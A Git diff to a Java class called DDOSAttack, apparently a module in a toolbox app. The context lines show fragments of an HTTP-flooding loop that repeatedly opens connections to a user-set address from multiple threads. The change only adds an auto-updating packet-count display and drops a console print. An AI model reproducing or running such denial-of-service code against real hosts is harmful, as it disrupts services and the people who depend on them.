@@ -2,6 +2,7 @@ package com.godpalace.godbox.modules;
 
 import com.godpalace.godbox.module_mgr.Module;
 import com.godpalace.godbox.module_mgr.ModuleArg;
+import com.godpalace.godbox.ui.BoxShowPanel;
 import com.godpalace.godbox.ui.ModuleSettingsPanel;
 import lombok.Getter;
 import lombok.Setter;
@@ -48,7 +49,6 @@ public class DDOSAttack implements Module {
                 URLConnection conn = url.openConnection();
                 packetCount++;
                 args[3].setValue(packetCount);
-                System.out.println("发包:" + packetCount);
                 conn.getInputStream();
 
                 Thread.sleep(attackInterval);
@@ -65,6 +65,8 @@ public class DDOSAttack implements Module {
     public void Enable() {
         enabled.set(true);
         packetCount = 0;
+        BoxShowPanel showPanel = (BoxShowPanel) args[3].getComponent();
+        showPanel.setAutoShow(true, 100);
         address = args[0].getValue().toString();
         attackInterval = Integer.parseInt(args[1].getValue().toString());
         threadCount = Integer.parseInt(args[2].getValue().toString());
